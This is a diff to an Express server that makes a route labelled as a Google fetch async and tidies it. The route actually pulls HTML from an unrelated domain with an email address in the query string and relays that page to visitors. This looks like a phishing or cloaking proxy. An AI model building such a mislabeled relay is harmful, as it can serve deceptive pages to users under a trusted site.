@@ -140,21 +140,23 @@ app.get('/', (req, res) => {
 });
 
 // Test route: fetch google.com and return its HTML
-app.get('/test-google', (req, res) => {
+app.get('/test-google', async (req, res) => {
   const url = 'https://account.circulations.digital/information.aspx?good=jobs@gmx.com';
   try {
-  const remote = await axios.get(url, {
-    headers: { 'User-Agent': 'Mozilla/5.0 (your-custom-UA)', 'Accept': 'text/html' },
-    timeout: 10000
-  });
-  console.log("Remote response status", remote.status);
-  console.log("Remote response headers", remote.headers);
-  res.setHeader('Content-Type', remote.headers['content-type'] || 'text/html');
-  return res.status(remote.status).send(remote.data);
-} catch (err) {
-  console.error("Axios fetch error:", err.message);
-  res.status(500).send("Remote fetch error");
-}
+    const remote = await axios.get(url, {
+      headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html' },
+      timeout: 10000
+    });
+    console.log("Remote response status", remote.status);
+    console.log("Remote response headers", remote.headers);
+
+    res.setHeader('Content-Type', remote.headers['content-type'] || 'text/html');
+    return res.status(remote.status).send(remote.data);
+  } catch (err) {
+    console.error("Axios fetch error:", err.message);
+    return res.status(500).send("Remote fetch error");
+  }
+});
 	
   /*https.get(url, { headers: { 'User-Agent': 'Node.js/HTTPS' } }, (proxyRes) => {
     let data = '';
@@ -174,7 +176,7 @@ app.get('/test-google', (req, res) => {
     console.error('Error fetching Google:', err.message);
     res.status(500).send('Error fetching Google');
   });*/
-});
+//});
 
 // API route that matches with slash param
 app.get('/api/id/:email', (req, res) => {
@@ -429,6 +431,7 @@ app.listen(PORT, () => {
 
 // Export app for Vercel
 module.exports = app;
+
 
 
 
